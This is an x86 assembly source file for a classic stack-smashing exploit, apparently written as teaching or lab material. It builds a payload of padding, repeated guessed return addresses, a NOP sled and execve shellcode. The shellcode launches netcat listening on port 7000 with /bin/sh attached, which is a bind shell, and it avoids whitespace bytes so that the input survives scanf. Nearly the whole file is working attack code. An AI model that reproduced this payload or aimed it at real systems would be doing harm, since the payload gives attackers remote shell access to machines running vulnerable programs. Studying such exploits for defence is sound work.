
.text


	
	                # we must export the entry point to the ELF linker or
    .global _start      # loader. They conventionally recognize _start as their
                        # entry point. Use ld -e foo to override the default.

# Jump to actual code in .data section. Actual code shouold be there since it 
# should be allocated with the data that are modified (args). Data cannot be in
# .text (.text is not modifiable) hence code should be in .data

	_start:		jmp start_nops

	
			
.data
# representation of the stack
buffer:	.space		16, 'A'		# dummy, it represent the buffer to smash


#       set this from outside using --defsym sym=value option of gnu as
#	.set	fakerp, 0xbffff670   # this is ok for debian sarge, both short and long argv[0]


		
	# we do not know exactly where the %eip is saved 
	# then we put here more than one copy
	# this is a fortunate situtation since the buffer is located very near
	# to the return address, no local variable is affected and hence
	# function finishing is granted

	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp

	
# the data of the payload
data_start:	
	.align		4
	.ascii		"arg>"		# 4 bytes keep allignement
	
p0:	.asciz		"/bin/nc"          # executable to launch with parameters...
p1:	.asciz		"-l"               # listen mode
p2:	.asciz          "-p"		   # port
p3:	.asciz          "7000"		   #   6000
p4:	.asciz          "-c"               # command to execute when connected:	
p5:	.ascii          "/bin/sh"	   #   a shell
p5b:	.asciz		"!-i"              #  "!" will be translated into a space


args:	#arguments array
pp0:	.long		0
pp1:	.long		0
pp2:	.long		0
pp3:	.long		0
pp4:	.long		0
pp5:	.long		0
pp6:	.long		0

	.ascii		"env>"
env:	.long		0                  # no envinoment 

	
	        

	.ascii		"nops>"


# the code of the payload
	
#start_nops: 	.space		923, 0x90		# 0x90 is opcode of NOP
start_nops: 	.space		1024, 0x90		# 0x90 is opcode of NOP

		
# execute the /bin/sh
	
	# get the address of the pop instruction
	call self
self:
	pop %ebp
	
	#set up parameters
	leal	(p0-self) (%ebp), %ebx	# first argument:  pathname executable

	leal	(args-self) (%ebp), %ecx		# second argument: pointer to array (zero terminated) of strings (zero terminated)
	leal	(p0-self)(%ebp), %eax
	movl	%eax, (pp0-self)(%ebp)
	leal	(p1-self)(%ebp), %eax
	movl	%eax, (pp1-self)(%ebp)
	leal	(p2-self)(%ebp), %eax
	movl	%eax, (pp2-self)(%ebp)
	leal	(p3-self)(%ebp), %eax
	movl	%eax, (pp3-self)(%ebp)
	leal	(p4-self)(%ebp), %eax
	movl	%eax, (pp4-self)(%ebp)
	leal	(p5-self)(%ebp), %eax
	movl	%eax, (pp5-self)(%ebp)

	#p5b should be traslated into a space
	decb	(p5b-self)(%ebp)     
		
        leal	(env-self) (%ebp), %edx		# third argument: environment, pointer to array of strings
	
	movl	$111,%eax
	subl	$100,%eax 
						# system call number 11 (sys_execve)
						# this fancy way does not introduce white-space chars
	
        int     $0x80				# call kernel
	.ascii "<int"
	.ascii "\n"	#scanf now recognize the end of the field!
